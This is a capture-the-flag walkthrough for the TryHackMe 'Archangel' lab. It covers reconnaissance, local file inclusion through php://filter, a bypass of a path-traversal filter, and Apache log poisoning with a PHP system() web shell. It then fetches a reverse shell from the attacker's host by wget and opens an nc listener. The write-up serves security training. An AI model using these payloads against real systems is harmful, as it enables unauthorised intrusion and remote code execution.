
# CTF Room: Archangel
- [Link to room](https://tryhackme.com/room/archangel)
- **Difficulty:** Easy
- **Category:** Boot2Root, Web, LFI, PrivEsc

## 1. Deploy Machine
A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.

#### Connect to openvpn and deploy the machine

## 2. Get a shell
#### Find a different hostname
### NMAP Scan
```bash
nmap -sV -sC -p- archangel.thm
```
```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 11:31 +0100
Nmap scan report for 10.81.160.105
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.14 seconds

```

Browsing to port 80 and inspecting the homepage gives us the domain we are looking for support@**mafialive.thm**

#### Find flag 1
### Modify /etc/hosts
```bash
sudo nano /etc/hosts
```
```bash
<ip>    mafialive.thm

CTRL+S
CTRL+X
```

Navigating to this site, we see the first flag :) 
```
thm{f0und_th3_r1ght_h0st_n4m3} 
```
#### Look for a page under development
### Robots.txt
```bash
ser-agent: *
Disallow: /test.php
```

This looks awfully like a page under development...

#### Find flag 2

To get flag 2, it is obvious to me that we have an LFI. On the page test.php there is a button, analysing the source code of that button indicates to us that we need to use the ?view= parameter to access something we shouldn't. Trying standard LFI didn't seem to work until I came across this below payload, using base64 conversion in the parameter.

### LFI Payload 1 (URL Encoded)
```bash
http://mafialive.thm/test.php?view=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2Fmrrobot.php
```

This shows us that mrrobot.php is just echoing "control is an illusion"

Now since we don't have any more information and don't know what the test.php script is doing, lets try and dump its source code through the below command:
### LFI Payload 2
```bash
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

Great Success! we now have our second flag and the *test.php* source code. Both outputs for reference were given as base64, I put them through Cyberchef to get the decoded output.
### test.php and flag 2

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```
#### Get a shell and find the user flag
Now, we need to find a way to make LFI work in this case and inject code to get a shell on the machine... Not going to lie, needed to do a bit of research on this one. I started by revisiting our initial scans, taking note of the web server version and software. 

Apache/2.4.29

Now, looking back at the LFI vulnerable code itself, we know that ../.. is not allowed, but what about ..//.. ? That has to be worth a shot :) 

Bypassing this protection, we now have a tunnel to pass code to the web server... I think it may be time to properly wake Burp Suite up. 

Apache2 stores its access log file under /var/www/apache2/access.log (This is within our reach). If we could put some code such as <?php system($_GET[‘cmd’]); ?> into this file, we have a way to pass the cmd parameter via the URL. 
### Payload after cmd can be passed
```
http://mafialive.thm/test.php?view=%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2F%2F..%2F%2F..%2F%2F..%2F%2Flog%2Fapache2%2Faccess.log&cmd=uname)
```

I wont attach the output of this as it is quite lengthy, basically it has given us output of the uname command. Now that this cmd parameter works, lets try a revshell, heres one that I prepared (found) earlier... 

```
https://github.com/pentestmonkey/php-reverse-shell

http://mafialive.thm/test.php?view=%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2F..%2F.%2F..%2F.%2F..%2Flog%2Fapache2%2Faccess.log&cmd=wget http://<yourIP>:1337/shell.php
```

Before passing this URL, ensure that you ran chmod +x to the php script and that you started a nc listener on port 1337 (unless you change both) via the following command. 

```
nc -lvnp 1337
```

*If you want to use a port that is not 1337, ensure that both the revshell and nc listener share the same port and that you dont choose a port that will be in use i.e. port 80*

